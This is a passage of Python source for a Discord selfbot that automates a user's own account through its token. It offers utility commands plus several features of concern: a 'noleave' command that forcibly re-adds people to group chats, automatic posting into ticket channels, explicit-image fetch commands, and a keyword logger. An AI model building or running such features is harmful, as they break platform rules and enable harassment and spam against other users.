        await webhook.send(ctx.author.mention,embed=embed,avatar_url=avatar)
        await webhook.delete()

    @commands.command()
    async def clone(self, ctx):
        await ctx.message.delete()
        new_channel = await ctx.channel.clone()
        await ctx.send(f"<:white_arrow:1290693789824061461> **Channel cloned:** {new_channel.mention}")

    @commands.command(aliases=['crw'])
    async def createwebhook(self, ctx,*, webhook_name = None):
        await ctx.message.delete()
        name = webhook_name or f"{selfbot_name}"
        webhook = await ctx.channel.create_webhook(name=name)
        await self.send_webhook_message(ctx, "Webhook Created", f"Webhook created: {webhook.url}")

    @commands.command(aliases=['del'])
    async def delete(self, ctx):
        await ctx.message.delete()
        await ctx.send("<:white_arrow:1290693789824061461> **Deleting this channel in 5 seconds.**",delete_after=4)
        await asyncio.sleep(5)
        await ctx.channel.delete()

    @commands.command(aliases=['ava'])
    async def avatar(self, ctx, user: discord.User = None):
        await ctx.message.delete()
        user = user or ctx.author
        avatar_url = user.avatar.url
        await send(ctx,".",f"[`{user.name}'s Avatar`]({avatar_url})\n",image=avatar_url,footer=".")

    @commands.command()
    async def banner(self, ctx, user: discord.User = None):
        await ctx.message.delete()
        user = user or ctx.author
        user_id = user.id if user else ctx.author.id
        url = f"https://discord.com/api/v9/users/{user_id}/profile"
        headers = {"Authorization": self.bot.http.token}
        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=headers) as response:
                if response.status != 200:
                    await ctx.send("Failed to fetch user info.\nInvalid user ID or You are not in any mutual server with the user")
                    return
                data = await response.json()        
        banner_id = data.get("user_profile", {}).get("banner")        
        if banner_id:
            ext = "gif" if banner_id.startswith("a_") else "png"
            banner_url = f"[`{user.name}'s Banner`](https://cdn.discordapp.com/banners/{user_id}/{banner_id}.{ext}?size=512)"
            url = f"https://cdn.discordapp.com/banners/{user_id}/{banner_id}.{ext}?size=512"
        else:
            banner_url = "Banner not found"
        await send(ctx,".",banner_url,image=None if banner_url == "Banner not found" else url,footer=".")

    @commands.command()
    async def roleinfo(self, ctx, role:discord.Role):
        await ctx.message.delete()
        role_info = (
            f"<:white_arrow:1290693789824061461> **Role Name:** `{role.name}`\n"
            f"<:white_arrow:1290693789824061461> **Role ID:** `{role.id}`\n"
            f"<:white_arrow:1290693789824061461> **Role Color:** `{role.color}`\n"
            f"<:white_arrow:1290693789824061461> **Role Members:** `{len(role.members)}`\n"
            f"<:white_arrow:1290693789824061461> **Role Position:** `{role.position}`\n"
            f"<:white_arrow:1290693789824061461> **Role Created At:** `{role.created_at.strftime('%Y-%m-%d')}`\n"
            f"<:white_arrow:1290693789824061461> **Role Mentionable:** `{'Yes' if role.mentionable else 'No'}`\n"
            f"<:white_arrow:1290693789824061461> **Role Hoisted:** `{'Yes' if role.hoist else 'No'}`\n"
            f"<:white_arrow:1290693789824061461> **Role Permissions:** `{role.permissions.value}`"
        )
        await send(ctx, "Role Info", role_info)   

    @commands.command(aliases=["user_info", "ui", "whois", "about"])
    async def userinfo(self, ctx, user: discord.Member = None):
        """Fetch and display user information in a text format."""
        await ctx.message.delete()
        if user is None:
            user = ctx.author

        # Fetch banner
        banner_url = None
        try:
            user_profile = await self.bot.http.get_user_profile(user.id)
            banner_hash = user_profile.get('user', {}).get('banner')
            if banner_hash:
                ext = "gif" if banner_hash.startswith("a_") else "png"
                banner_url = f"https://cdn.discordapp.com/banners/{user.id}/{banner_hash}.{ext}?size=600"
        except Exception:
            pass

        # Fetch avatar
        avatar_url = str(user.avatar.url) if user.avatar else None

        # Parse account creation time
        created_timestamp = f"<t:{int(user.created_at.timestamp())}:F>"

        # Account age in years
        now_utc = datetime.now(pytz.utc)
        account_age = (now_utc - user.created_at.replace(tzinfo=pytz.utc) if user.created_at.tzinfo is None else now_utc - user.created_at).days // 365

        # Mutual servers
        mutual_guilds = len(user.mutual_guilds) if hasattr(user, "mutual_guilds") else "Unknown"

        # Presence and activity
        presence = str(user.status).title() if hasattr(user, "status") else "Unknown"
        activity = user.activity.name if hasattr(user, "activity") and user.activity else "None"

        # Bot status
        bot_status = "Yes" if user.bot else "No"

        user_info_msg = (
            f"<:user:1325418236514140282> **Name** : {user.name}\n"
            f"<:star_blue:1284898457181622362> **User ID** : `{user.id}`\n"
            f"<:star_blue:1284898457181622362> **Account Age** : `{account_age}` Years\n"
            f"<:star_blue:1284898457181622362> **Created At** : {created_timestamp}\n"
            f"<:star_blue:1284898457181622362> **User Banner** : [ [{user.name}'s Banner]({banner_url if banner_url else 'N/A'}) ]\n"
            f"<:star_blue:1284898457181622362> **User Avatar** : [ [{user.name}'s Avatar]({avatar_url if avatar_url else 'N/A'}) ]\n\n"
            f"**<a:Bot:1336670517486161951> Bot User** : `{bot_status}`\n"
            f"**<:Partner:1290693797000380437> Presence** : `{presence}`\n"
            f"**<:TOS:1336669803221614622> Activity** : `{activity}`\n"
            f"**<:SQ_hearts:1288196135206518825> Mutual Servers** : `{mutual_guilds}`"
        )

        await send(ctx, "User Information <:rules:1290926829762383934>", user_info_msg, thumbnail=avatar_url, image=banner_url)

    @commands.command(aliases=['si'])
    async def serverinfo(self, ctx):
        await ctx.message.delete()
        guild = ctx.guild
        created_timestamp = int(guild.created_at.timestamp())

        # Icon URL
        icon_url = str(guild.icon.url) if guild.icon else None
        icon_link = f"[SERVER LOGO IMAGE]({icon_url})" if icon_url else "None"

        # Owner
        owner = guild.owner
        owner_name = owner.name if owner else "Unknown"
        owner_id = owner.id if owner else "Unknown"
        owner_text = f"[{owner_name}] <@{owner_id}>" if owner_name != "Unknown" else "Unknown"

        message = (
            f"**<:discord:1282007043456241717> Name: {guild.name}\n"
            f"<:experienced_seller:1290924799421583391> ID: `{guild.id}`\n"
            f"<:SQ_hearts:1288196135206518825> Server Icon: {icon_link}\n\n"
            f"<:max_r_owner:1288194870086860850> Owner: {owner_text}\n"
            f"<:discord:1282007043456241717> Owner ID: `{owner_id}`\n"
            f"<:white_Arrow:1290693791983861822> Created At: <t:{created_timestamp}:F>\n\n"
            f"<:emoji_1738476603350:1335492413153742961> Total Boosts: `{guild.premium_subscription_count}` Boosts\n"
            f"<:tz_Boost_icon:1281241573035868220> Boost Level: `{guild.premium_tier}` Level {'[Max]' if guild.premium_tier == 3 else ''}\n\n"
            f"<:user:1325418236514140282> Members: `{guild.member_count}`\n"
            f"<:emoji_1738476614300:1335492458909401088> Channels: `{len(guild.channels)}`\n"
            f"<:emoji_1738476622593:1335492493680185384> Roles: `{len(guild.roles)}`\n"
            f"<a:emoji:1308820256873123980> Emojis: `{len(guild.emojis)}`**"
        )
        await send(ctx, "Server Info <:nxt_blue_crown:1281973611917348989>", message, thumbnail=icon_url)

    @commands.command(name="serverfriends", aliases=["sf", "server_friends"])
    async def serverfriends(self, ctx):
        await ctx.message.delete()
        friends_ids = [friend.id for friend in self.bot.user.friends]
        mutual_friends = [
            f"{member.name}#{member.discriminator}"
            for member in ctx.guild.members
            if member.id in friends_ids and member.id != ctx.author.id
        ]

        if not mutual_friends:
            await send(ctx, "Server Friends", "❌ No friends found in this server.")
            return

        message = (
            f"**[Total]: `{len(mutual_friends)}`**\n\n"
            f"{', '.join(mutual_friends)}"
        )
        await send(ctx, f"Server Friends in {ctx.guild.name} <:experienced_seller:1290924799421583391>", message)

    @commands.command(aliases=['memberscount','members','mc'])
    async def membercount(self,ctx):
        await ctx.message.delete()  
        guild = ctx.guild 
        member_count = guild.member_count
        await send(ctx,"Members",f"<:white_arrow:1290693789824061461>  **Server name : {guild.name}** \n<:white_arrow:1290693789824061461> **Members : {member_count}**")

    @commands.command(aliases=['boosts','bc'])
    async def boostcount(self,ctx):
        await ctx.message.delete()     
        guild = ctx.guild 
        boost_count = guild.premium_subscription_count 
        await send(ctx,"Boosts",f"<:white_arrow:1290693789824061461>  **Server name : {guild.name}** \n<:white_arrow:1290693789824061461>  **Boosts : {boost_count}**")    

    @commands.command(aliases=['sendweb','websend','sendwebhook'])
    async def webhooksend(self,ctx, webhook_url):
        await ctx.message.delete()
        ask_type = await ctx.send(">>> What type of message do you want to send from webhook ,Send option number of your choice\nOptions :\n\n  `1` = **Embed**\n `2` = **Normal**.")

        def check(msg):
            return msg.author == ctx.author and msg.channel == ctx.channel

        try:
            type_msg = await self.bot.wait_for('message', check=check, timeout=60)
            msg_type = type_msg.content
            await ask_type.delete()
            
            await type_msg.delete()

            if msg_type == '1':
                ask_title = await ctx.send(">>> What should be the title of the embed?")
                title_msg = await self.bot.wait_for('message', check=check, timeout=60)
                title = title_msg.content
                await ask_title.delete()
                await title_msg.delete()
                ask_description = await ctx.send(">>> What will be the description of the embed?")
                description_msg = await self.bot.wait_for('message', check=check, timeout=60)
                description = description_msg.content
                await ask_description.delete()
                await description_msg.delete()
                ask_footer = await ctx.send(">>> What will be the footer of the embed?")
                footer_msg = await self.bot.wait_for('message', check=check, timeout=60)
                footer = footer_msg.content
                await ask_footer.delete()
                await footer_msg.delete()
                color_options = """
                What will be the color of the embed , send option number of your choice:\n\nOptions :\n
                `1` : Blue
                `2` : Green
                `3` : Red
                `4` : Yellow
                `5` : Purple
                `6` : Orange
                `7` : Dark Blue
                `8` : Dark Green
                `9` : Dark Red
                `10` : Black
                """
                ask_colour = await ctx.send(color_options)

                color_choices = {
                    '1': discord.Color.blue(),
                    '2': discord.Color.green(),
                    '3': discord.Color.red(),
                    '4': discord.Color.gold(),
                    '5': discord.Color.purple(),
                    '6': discord.Color.orange(),
                    '7': discord.Color.dark_blue(),
                    '8': discord.Color.dark_green(),
                    '9': discord.Color.dark_red(),
                    '10': discord.Color(0x000000) 
                }
                colour_msg = await self.bot.wait_for('message', check=check, timeout=60)
                colour_choice = colour_msg.content
                await ask_colour.delete()
                ()
                await colour_msg.delete()
                colour = color_choices.get(colour_choice, discord.Color.blue())

                embed = discord.Embed(title=title, description=description, color=colour)
                embed.set_footer(text=footer)
                await send_webhook(webhook_url, embed)

            elif msg_type == '2':
                ask_normal = await ctx.send(">>> What message do you want to send from your webook?")
                normal_msg = await self.bot.wait_for('message', check=check, timeout=60)
                message = normal_msg.content
                await ask_normal.delete()
                ()
                await normal_msg.delete()
                await send_webhook(webhook_url, message)

            else:
                await senderror(ctx,"Invalid","Invalid choice. Please type `1` for embed or `2` for normal message.","10")

        except asyncio.TimeoutError:
            await senderror(ctx,"Timeout","You took too long to respond! Please try again.")

class nsfw(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    async def fetch_and_download_image(self, ctx, api_url, default_filename):
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url) as response:
                if response.status == 200:
                    json_data = await response.json()
                    url = json_data.get("message") or json_data.get("url")
                    if url:
                        async with session.get(url) as image_response:
                            if image_response.status == 200:
                                content_type = image_response.headers.get('Content-Type', '')
                                if "image" in content_type:
                                    extension = content_type.split("/")[1]
                                    filename = f"{default_filename}.{extension}"
                                else:
                                    filename = default_filename

                                image_data = await image_response.read()
                                file = discord.File(io.BytesIO(image_data), filename=filename)
                                try:
                                    await ctx.channel.send(file=file)
                                except:
                                    new_url = f"[NSFW-IMAGE]({url})"
                                    await send(ctx,".",new_url,image=url)

    @commands.command()
    async def nsfw(self, ctx):
        await ctx.message.delete()
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        prefix = config.get("prefix")
        description = (
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"
            f"<:BadgeDeveloper:1290693804013129768> **`[REQUIRED] | <OPTIONAL>`** <a:Bot:1336670517486161951>\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"                        
            f"<:tharkimon:1291420565911113809> | **anal image** **:** **`{prefix}anal`**\n"
            f"<:tharkimon:1291420565911113809> | **hentai anal image** **:** **`{prefix}hanal`**\n"
            f"<:tharkimon:1291420565911113809> | **4K NSFW image** **:** **`{prefix}4k`**\n"
            f"<:tharkimon:1291420565911113809> | **NSFW GIF image** **:** **`{prefix}gif`**\n"
            f"<:tharkimon:1291420565911113809> | **pussy image** **:** **`{prefix}pussy`**\n"
            f"<:tharkimon:1291420565911113809> | **boobs image** **:** **`{prefix}boobs`**\n"
            f"<:tharkimon:1291420565911113809> | **ass image** **:** **`{prefix}ass`**\n"
            f"<:tharkimon:1291420565911113809> | **waifu image** **:** **`{prefix}waifu`**\n"
            f"<:tharkimon:1291420565911113809> | **hentai boobs image** **:** **`{prefix}hboobs`**\n"
            f"<:tharkimon:1291420565911113809> | **thigh image** **:** **`{prefix}thighs`**\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>"
        )
        await send(ctx, "<:devs:1290693770567749652>__NSFW Commands__<:Titanz:1281243489635405827>", description)

    @commands.command()
    async def anal(self, ctx):
        await ctx.message.delete()
        await self.fetch_and_download_image(ctx, "https://nekobot.xyz/api/image?type=anal", "anal")

    @commands.command()
    async def hanal(self, ctx):
        await ctx.message.delete()
        await self.fetch_and_download_image(ctx, "https://nekobot.xyz/api/image?type=hanal", "hanal")

    @commands.command(name="4k")
    async def _4k(self, ctx):
        await ctx.message.delete()
        await self.fetch_and_download_image(ctx, "https://nekobot.xyz/api/image?type=4k", "4k")

    @commands.command()
    async def gif(self, ctx):
        await ctx.message.delete()
        await self.fetch_and_download_image(ctx, "https://nekobot.xyz/api/image?type=pgif", "nsfw")

    @commands.command()
    async def pussy(self, ctx):
        await ctx.message.delete()
        await self.fetch_and_download_image(ctx, "https://nekobot.xyz/api/image?type=pussy", "pussy")

    @commands.command()
    async def boobs(self, ctx):
        await ctx.message.delete()
        await self.fetch_and_download_image(ctx, "https://nekobot.xyz/api/image?type=boobs", "boobs")

    @commands.command()
    async def ass(self, ctx):
        await ctx.message.delete()
        await self.fetch_and_download_image(ctx, "https://nekobot.xyz/api/image?type=ass", "ass")

    @commands.command()
    async def hboobs(self, ctx):
        await ctx.message.delete()
        await self.fetch_and_download_image(ctx, "https://nekobot.xyz/api/image?type=hboobs", "hboobs")

    @commands.command(aliases=['thigh'])
    async def thighs(self, ctx):
        await ctx.message.delete()
        await self.fetch_and_download_image(ctx, "https://nekobot.xyz/api/image?type=thigh", "thighs")

    @commands.command()
    async def waifu(self, ctx):
        await ctx.message.delete()
        await self.fetch_and_download_image(ctx, "https://api.waifu.pics/nsfw/waifu", "waifu")

class other(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.tts_language = 'en'
        self.api_base_url = "https://discord.com/api/v9"
        self.typing_task = None       

    async def do_tts(self, message):
        """Convert text to speech and return as a file-like object."""
        f = io.BytesIO()
        tts = gTTS(text=message.lower(), lang=self.tts_language)
        tts.write_to_fp(f)
        f.seek(0)
        return f

    @commands.command()
    async def sc(self, ctx, category_id: int, *, message: str):
        await ctx.message.delete()
        if ctx.guild is None:
            await send(ctx, "Ticket Message", "This command can only be used in a server.")
            return

        category = discord.utils.get(ctx.guild.categories, id=category_id)
        if category is None:
            await send(ctx, "Ticket Message", "Category not found.")
            return

        if category_id in active_tasks:
            await send(ctx, "Ticket Message", f"A message task is already running for this category. Please stop it first using `{ctx.prefix}stopsc`.")
            return

        category_messages[category_id] = message
        active_tasks[category_id] = True

        await send(ctx, "Ticket Message", f"**Sending Msg In Ticket Create Category: {category.name}.**")
        print(f"TICKET MSG CATEGORY SET for {category.name}")

    @commands.command()
    async def pausesc(self, ctx, category_id: int):
        await ctx.message.delete()
        if category_id not in active_tasks or not active_tasks[category_id]:
            await send(ctx, "Ticket Message", "No active message task found for this category.")
            return

        active_tasks[category_id] = False
        await send(ctx, "Ticket Message", f"**Paused Sending Msg In Ticket Create Category Id: {category_id}.**")

    @commands.command()
    async def listsc(self, ctx):
        await ctx.message.delete()
        if not active_tasks:
            await send(ctx, "Ticket Message", "No active message tasks are running.")
            return

        task_list = []
        for category_id in active_tasks:
            if active_tasks[category_id]:
                category = discord.utils.get(ctx.guild.categories, id=category_id)
                category_name = category.name if category else "Unknown Category"
                task_list.append(f"**Category:** {category_name} (`{category_id}`) - **Message:** {category_messages[category_id]}")

        if task_list:
            await send(ctx, "Ticket Message", "**Active Message Tasks:**\n" + "\n".join(task_list))
        else:
            await send(ctx, "Ticket Message", "No active message tasks are running.")

    @commands.command()
    async def resumesc(self, ctx, category_id: int):
        await ctx.message.delete()
        if category_id not in category_messages:
            await send(ctx, "Ticket Message", "No message task is set for this category.")
            return
        if active_tasks.get(category_id, False):
            await send(ctx, "Ticket Message", "This message task is already running.")
            return

        active_tasks[category_id] = True
        await send(ctx, "Ticket Message", f"**Resumed Sending Msg In Ticket Create Category Id: {category_id}.**")

    @commands.command()
    async def clearsc(self, ctx):
        await ctx.message.delete()
        if not active_tasks:
            await send(ctx, "Ticket Message", "No active message tasks to clear.")
            return

        active_tasks.clear()
        category_messages.clear()
        await send(ctx, "Ticket Message", "**All ticket message tasks have been cleared.**")

    @commands.command()
    async def delaysc(self, ctx, category_id: int, delay: int):
        await ctx.message.delete()
        if delay < 0:
            await send(ctx, "Ticket Message", "Invalid delay. Please enter a positive number.")
            return

        message_delays[category_id] = delay
        await send(ctx, "Ticket Message", f"**Message delay set to {delay} seconds for Category Id: {category_id}.**")

    @commands.command()
    async def stopsc(self, ctx, category_id: int):
        await ctx.message.delete()
        if category_id not in active_tasks:
            await send(ctx, "Ticket Message", "No message task is running for this category.")
            return

        del active_tasks[category_id]
        if category_id in category_messages:
            del category_messages[category_id]

        await send(ctx, "Ticket Message", f"**Stopped Sending Msg In Ticket Create Category: {category_id}.**")
        print(f"TICKET MSG CATEGORY REMOVED for {category_id}")

    @commands.command()
    async def editsc(self, ctx, category_id: int, *, new_message: str):
        await ctx.message.delete()
        if category_id not in active_tasks:
            await send(ctx, "Ticket Message", f"No active message task found for this category. Use `{ctx.prefix}sc` to start a new one.")
            return

        category_messages[category_id] = new_message
        await send(ctx, "Ticket Message", f"**Updated Message For Ticket Create Category: {category_id}.**")
        print(f"TICKET MSG CATEGORY UPDATED for {category_id}")

    @commands.command(description="Keeps re-adding someone to a group chat when they leave.")
    async def noleave(self, ctx, user: discord.User = None):
        await ctx.message.delete()
        if user is None:
            await send(ctx, "No Leave", ":x: | Please specify a user.")
            return

        if user.id in noLeave:
            await send(ctx, "No Leave", f"{user.name} is already in the no leave list.")
            return

        noLeave.append(user.id)
        await send(ctx, "No Leave", f"Added {user.name} to the no leave list.")

    @commands.command(description="Removes someone from the no leave list.")
    async def allowleave(self, ctx, user: discord.User = None):
        await ctx.message.delete()
        if user is None:
            await send(ctx, "No Leave", ":x: | Please specify a user.")
            return

        if user.id not in noLeave:
            await send(ctx, "No Leave", f"{user.name} is not in the no leave list.")
            return

        noLeave.remove(user.id)
        await send(ctx, "No Leave", f"Removed {user.name} from the no leave list.")

    @commands.command(aliases=["ms", "mutual_servers"])
    async def mutualservers(self, ctx, user: discord.User = None):
        """Lists all mutual servers with a user."""
        await ctx.message.delete()
        if user is None:
            await send(ctx, "Mutual Servers", ":x: | Please specify a user.")
            return

        mutual_servers = [guild.name for guild in self.bot.guilds if guild.get_member(user.id)]

        if not mutual_servers:
            await send(ctx, "Mutual Servers", f"No mutual servers found with {user.name}.")
            return

        message = (
            f"**[Total]: `{len(mutual_servers)}`**\n"
            f"```\n{', '.join(mutual_servers)}\n```"
        )
        await send(ctx, f"Mutual Servers with {user.name}#{user.discriminator} <:Angel_of_coowner:1290692091432800357>", message)

    @commands.command()
    async def af(self, ctx, *, args):
        """Set an auto-forward trigger mapping."""
        await ctx.message.delete()
        parts = [p.strip() for p in args.split(",")]

        if len(parts) < 2:
            await senderror(ctx, "Auto Forward", "❌ Invalid format.\nUse: `+af <trigger>, <message_id> [channel_id]`")
            return

        trigger = parts[0].lower()

        try:
            message_id = int(parts[1].replace("`", "").replace("<", "").replace(">", "").strip())
        except ValueError:
            await senderror(ctx, "Auto Forward", "❌ Message ID must be a number.")
            return

        try:
            channel_id = int(parts[2].strip()) if len(parts) >= 3 else ctx.channel.id
        except ValueError:
            await senderror(ctx, "Auto Forward", "❌ Channel ID must be a number.")
            return

        target_channel = self.bot.get_channel(channel_id)
        if not target_channel:
            await senderror(ctx, "Auto Forward", "❌ Couldn't find the specified channel.")
            return

        try:
            msg = await target_channel.fetch_message(message_id)
        except:
            await senderror(ctx, "Auto Forward", "❌ Couldn't find the message in the specified channel.")
            return

        af_triggers[trigger] = {
            "message_id": str(msg.id),
            "channel_id": str(target_channel.id)
        }

        with open(af_file, "w") as f:
            json.dump(af_triggers, f, indent=2)

        await send(ctx, "Auto Forward Success", f"✅ Trigger `{trigger}` set to forward message `{msg.id}` from <#{target_channel.id}>")

    @commands.command()
    async def afrem(self, ctx, trigger: str):
        """Remove an auto-forward trigger."""
        await ctx.message.delete()
        trigger = trigger.lower()
        if trigger in af_triggers:
            del af_triggers[trigger]
            with open(af_file, "w") as f:
                json.dump(af_triggers, f, indent=2)
            await send(ctx, "Auto Forward Remove", f"🗑️ Removed trigger `{trigger}`")
        else:
            await senderror(ctx, "Auto Forward Remove", "❌ Trigger not found")

    @commands.command()
    async def afreset(self, ctx):
        """Reset all auto-forward triggers."""
        await ctx.message.delete()
        af_triggers.clear()
        with open(af_file, "w") as f:
            json.dump(af_triggers, f, indent=2)
        await send(ctx, "Auto Forward Reset", "🔁 All auto-forward triggers cleared")

    @commands.command()
    async def aflist(self, ctx):
        """List all auto-forward triggers."""
        await ctx.message.delete()
        if not af_triggers:
            await send(ctx, "Auto-Forward Triggers", "📭 No auto-forward triggers set.")
            return

        lines = [
            f"🔹 `{trigger}` → msg_id: `{data['message_id']}` in channel: `{data['channel_id']}`"
            for trigger, data in af_triggers.items()
        ]
        content = "\n".join(lines)
        await send(ctx, "📌 Auto-Forward Triggers", content, footer="Developed by siddhu.og", image="https://cdn.discordapp.com/attachments/1255090765726748694/1377325399419260980/5.jpg")

    @commands.command()
    async def binary(self, ctx, *, text):
        """Convert text to binary."""
        await ctx.message.delete()
        binary_text = " ".join(format(ord(char), "08b") for char in text)
        await send(ctx, "Binary Conversion", f"💾 **Binary:** `{binary_text}`")

    @commands.command()
    async def unbinary(self, ctx, *, binary_text):
        """Convert binary to text."""
        await ctx.message.delete()
        try:
            text = "".join(chr(int(binary, 2)) for binary in binary_text.split())
            await send(ctx, "Binary Conversion", f"🔄 **Text:** `{text}`")
        except ValueError:
            await senderror(ctx, "Binary Conversion", "<:CROSS_TDG:1321149916201881683> Invalid binary input.")

    @commands.command()
    async def wiki(self, ctx, *, query):
        """Search Wikipedia."""
        await ctx.message.delete()
        from urllib.parse import quote_plus

        # Use the action API — never 403s and supports disambiguation
        search_url = (
            f"https://en.wikipedia.org/w/api.php"
            f"?action=query&list=search&srsearch={quote_plus(query)}"
            f"&format=json&srlimit=1"
        )
        ua = "Mozilla/5.0 (compatible; VoltriX-SelfBot/1.0; +https://github.com)"
        headers = {"User-Agent": ua, "Accept": "application/json"}

        try:
            async with aiohttp.ClientSession() as session:
                # Step 1: search for the page title
                async with session.get(search_url, headers=headers) as resp:
                    if resp.status != 200:
                        await senderror(ctx, "Wiki Search", f"<:CROSS_TDG:1321149916201881683> Wikipedia search failed (Status: {resp.status}).")
                        return
                    search_data = await resp.json()

                results = search_data.get("query", {}).get("search", [])
                if not results:
                    await senderror(ctx, "Wiki Search", "<:CROSS_TDG:1321149916201881683> No Wikipedia page found for that query.")
                    return

                page_title = results[0]["title"]

                # Step 2: fetch the extract/summary for that page
                extract_url = (
                    f"https://en.wikipedia.org/w/api.php"
                    f"?action=query&prop=extracts&exintro&explaintext"
                    f"&titles={quote_plus(page_title)}"
                    f"&format=json&redirects=1"
                )
                async with session.get(extract_url, headers=headers) as eresp:
                    if eresp.status != 200:
                        await senderror(ctx, "Wiki Search", f"<:CROSS_TDG:1321149916201881683> Failed to fetch page (Status: {eresp.status}).")
                        return
                    edata = await eresp.json()

                pages = edata.get("query", {}).get("pages", {})
                page = next(iter(pages.values()), {})
                extract = page.get("extract", "").strip()
                real_title = page.get("title", page_title)
                page_url = f"https://en.wikipedia.org/wiki/{quote_plus(real_title.replace(' ', '_'))}"

                if not extract:
                    await senderror(ctx, "Wiki Search", "<:CROSS_TDG:1321149916201881683> No summary available for this page.")
                    return

                # Trim to ~1500 chars and add a link
                if len(extract) > 1500:
                    extract = extract[:1497] + "..."
                extract += f"\n\n[**Read more →**]({page_url})"

                await send(ctx, f"📖 {real_title}", extract)

        except Exception as e:
            await senderror(ctx, "Wiki Search", f"<:CROSS_TDG:1321149916201881683> An error occurred: {str(e)}")


    @commands.command()
    async def timestamp(self, ctx, *, datetime_str: str = None):
        """Generate a UNIX timestamp for the given date and time or current timestamp."""
        await ctx.message.delete()
        try:
            if datetime_str:
                from dateutil import parser
                dt = parser.parse(datetime_str, dayfirst=True)
                ts = int(dt.timestamp())
            else:
                import time
                ts = int(time.time())

            response = f"<t:{ts}:d> <t:{ts}:R>"
            await ctx.send(response)
        except Exception as e:
            await senderror(ctx, "Timestamp", "<:CROSS_TDG:1321149916201881683> Invalid date format! Use `DD/MM/YYYY HH:MM`.")
            print(f"Timestamp error: {e}")

    async def get_user_id_from_input(self, ctx, user_input):
        if user_input.startswith("<@") and user_input.endswith(">"):
            return user_input.strip("<@!>"), None
        elif user_input.isdigit():
            return user_input, None
        else:
            user = discord.utils.get(self.bot.users, name=user_input)
            if user:
                return str(user.id), None
            return None, "❌ User not found!"

    @commands.command()
    async def block(self, ctx, user_input: str = None):
        """Blocks a user via @mention, User ID, or Username."""
        await ctx.message.delete()
        if user_input is None:
            await senderror(ctx, "Block", "❌ Please provide a user (@mention, ID, or username).")
            return

        user_id, error = await self.get_user_id_from_input(ctx, user_input)
        if error:
            await senderror(ctx, "Block", error)
            return

        url = f"https://discord.com/api/v9/users/@me/relationships/{user_id}"
        headers = {"Authorization": self.bot.http.token, "Content-Type": "application/json"}
        try:
            async with aiohttp.ClientSession() as session:
                async with session.put(url, headers=headers, json={"type": 2}) as resp:
                    if resp.status == 204:
                        await send(ctx, "Block Success", f"✅ Successfully blocked <@{user_id}>!")
                    else:
                        await senderror(ctx, "Block Failed", f"❌ Failed to block <@{user_id}>: Status {resp.status}")
        except Exception as e:
            await senderror(ctx, "Block Error", f"❌ Error: {e}")

    @commands.command()
    async def unblock(self, ctx, user_input: str = None):
        """Unblocks a user via @mention, User ID, or Username."""
        await ctx.message.delete()
        if user_input is None:
            await senderror(ctx, "Unblock", "❌ Please provide a user (@mention, ID, or username).")
            return

        user_id, error = await self.get_user_id_from_input(ctx, user_input)
        if error:
            await senderror(ctx, "Unblock", error)
            return

        url = f"https://discord.com/api/v9/users/@me/relationships/{user_id}"
        headers = {"Authorization": self.bot.http.token, "Content-Type": "application/json"}
        try:
            async with aiohttp.ClientSession() as session:
                async with session.delete(url, headers=headers) as resp:
                    if resp.status == 204:
                        await send(ctx, "Unblock Success", f"✅ Successfully unblocked <@{user_id}>!")
                    else:
                        await senderror(ctx, "Unblock Failed", f"❌ Failed to unblock <@{user_id}>: Status {resp.status}")
        except Exception as e:
            await senderror(ctx, "Unblock Error", f"❌ Error: {e}")

    @commands.command()
    async def blocklist(self, ctx):
        """Shows a list of blocked users."""
        await ctx.message.delete()
        headers = {"Authorization": self.bot.http.token}
        url = "https://discord.com/api/v9/users/@me/relationships"
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, headers=headers) as resp:
                    if resp.status == 200:
                        relationships = await resp.json()
                        blocked_users = [r for r in relationships if r['type'] == 2]
                        if not blocked_users:
                            await send(ctx, "Blocked Users", "<:CROSS_TDG:1321149916201881683> You have no blocked users.")
                            return

                        blocked_list = "\n".join(
                            [f"**{i+1}.** `{user['user']['username']}#{user['user']['discriminator']}` (ID: `{user['id']}`)" 
                             for i, user in enumerate(blocked_users)]
                        )
                        await send(ctx, "Blocked Users <:Block:1336670517486161951>", blocked_list)
                    else:
                        await senderror(ctx, "Blocklist", f"<:CROSS_TDG:1321149916201881683> Failed to fetch: Status {resp.status}")
        except Exception as e:
            await senderror(ctx, "Blocklist Error", f"<:CROSS_TDG:1321149916201881683> Error: {e}")

    @commands.group(invoke_without_command=True)
    async def keyword(self, ctx):
        """Keyword Logger management commands."""
        await ctx.message.delete()
        status = "✅ Enabled" if keyword_logger_enabled else "❌ Disabled"
        webhook_set = "✅ Set" if keyword_logger_webhook else "❌ Not set"
        kw_count = len(keyword_logger_keywords)
        msg = (
            f"**Status:** {status}\n"
            f"**Webhook:** {webhook_set}\n"
            f"**Keywords:** `{kw_count}` configured\n\n"
            f"**Subcommands:**\n"
            f"> `+keyword logging enable/disable` — toggle logger\n"
            f"> `+keyword webhook <url>` — set webhook URL\n"
            f"> `+keyword add <word>` — add a keyword\n"
            f"> `+keyword remove <word>` — remove a keyword\n"
